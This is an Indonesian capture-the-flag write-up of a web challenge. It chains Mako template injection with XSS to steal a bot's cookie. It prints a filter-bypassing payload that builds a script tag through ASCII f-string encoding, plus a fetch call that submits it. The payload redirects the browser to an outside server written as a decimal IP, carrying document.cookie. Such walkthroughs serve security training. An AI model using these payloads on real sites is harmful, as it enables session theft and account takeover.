
# Employee Validator

Tantangan *Web Exploitation* tingkat tinggi yang menggabungkan *Server-Side Template Injection* (SSTI) pada mesin Mako dengan teknik *bypass* filter karakter yang sangat restriktif untuk melakukan eksfiltrasi *cookie* melalui XSS.

[DOWNLOAD_ARTIFACT](./dist_2.tar)

## The Scenario

Kami diberikan sebuah aplikasi web bernama "Employee Name Validator" yang dikembangkan oleh IT Division. Sistem ini diklaim mampu menyaring input yang tidak sesuai standar perusahaan. Setiap input yang dimasukkan akan divalidasi dan ditampilkan kembali di halaman. Terdapat juga fitur "Report Issue" yang akan memicu **Automated Auditor** (bot) untuk mengunjungi URL yang bermasalah.

Berdasarkan analisis *source code* yang diberikan (`main.py` dan `bot.py`), terdapat beberapa mekanisme pertahanan:
1. **HTML Escaping**: Karakter `& < > ( )` diubah menjadi entitas HTML untuk mencegah XSS standar.
2. **Blacklist Karakter**: Daftar hitam `banned` melarang penggunaan huruf `s`, `l`, titik `.`, kurung `()`, garis bawah `_`, *backslash* `\`, dan kata kunci seperti `import`, `os`, dan `eval`.
3. **Bot Environment**: Bot menggunakan *Headless Chrome* dan membawa *cookie* sensitif bernama `flag`.

Berdasarkan analisis itu maka dapat di nyatakan di web yg di block bohong 😡😡
## Reconnaissance

Langkah pertama adalah menentukan teknologi di balik layar. Dengan memasukkan `${7*7}`, aplikasi merespons dengan angka `49`. Ini mengonfirmasi adanya celah **SSTI pada Mako Template Engine**.

Tantangan utamanya adalah daftar hitam yang melarang hampir semua karakter penting. Berikut adalah batasan yang harus dilewati:

* **Tanpa Huruf 's' dan 'l'**: Menutup akses ke `script`, `alert`, `location`, `os`, `self`., untungnya kita bisa pakai S besar dan L besar
* **Tanpa Titik '.'**: Menutup akses ke properti objek (`document.cookie`) dan alamat IP standar.
* **Tanpa Kurung '()'**: Mencegah pemanggilan fungsi Python atau JavaScript.

## Extraction Script

Untuk melewati filter tersebut, kami menggunakan fitur **f-strings** di Python (yang didukung oleh Mako) untuk menghasilkan karakter terlarang menggunakan kode ASCII (`{angka:c}`).

Strategi *bypass*:

1. **ASCII Encoding**: Menggunakan `{60:c}` untuk `<`, `{115:c}` untuk `s`, dan `{108:c}` untuk `l`.
2. **Bracket Notation**: Mengakses properti JavaScript menggunakan `obj['prop']` sebagai pengganti `obj.prop`.
3. **Decimal IP**: Mengonversi IP server penangkap (*webhook*) menjadi angka desimal (Integer) untuk menghindari karakter titik.
4. **Redirection vs Fetch**: Karena `fetch` dibatasi oleh kebijakan CORS, kami menggunakan `window.location` untuk mengirimkan data.

Berikut adalah *payload* final yang dikirimkan melalui parameter `name_input`:

```python
${f'{60:c}{115:c}cript{62:c}window[{39:c}{108:c}ocation{39:c}]={39:c}http://2990490474/UUID?c={39:c}{43:c}document[{39:c}cookie{39:c}]{60:c}/{115:c}cript{62:c}'}

```

*Penjelasan Payload:*

* `{60:c}{115:c}cript{62:c}`: Menghasilkan tag `<script>`.
* `window[{39:c}{108:c}ocation{39:c}]`: Mengakses `window['location']` (bypass huruf 'l').
* `2990490474`: Alamat IP `178.63.67.106` dalam bentuk desimal (bypass titik).
* `{43:c}`: Menghasilkan tanda `+` untuk penggabungan string (bypass URL encoding).
* `document[{39:c}cookie{39:c}]`: Mengambil nilai `document['cookie']`.

## The Verdict

Setelah menyusun *payload*, langkah terakhir adalah mengirimkannya ke auditor. Kami menjalankan perintah `fetch` berikut pada *Console* browser untuk mengirimkan laporan ke endpoint `/report`:

```javascript
fetch('/report', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
        name: "${f'{60:c}{115:c}cript{62:c}window[{39:c}{108:c}ocation{39:c}]={39:c}http://2990490474/6622f290-4a03-4406-8a5d-bef852602b6e?c={39:c}{43:c}document[{39:c}cookie{39:c}]{60:c}/{115:c}cript{62:c}'}"
    })
});

```

Bot segera mengunjungi URL tersebut. Di sisi server, mesin Mako mengevaluasi f-string tersebut dan merender tag skrip JavaScript yang sah di browser bot. Bot kemudian dialihkan ke server *webhook* kami dengan membawa data *cookie* di dalam parameter URL.

> TBF1{C00k1e_f0r_th3_w1nn3r}
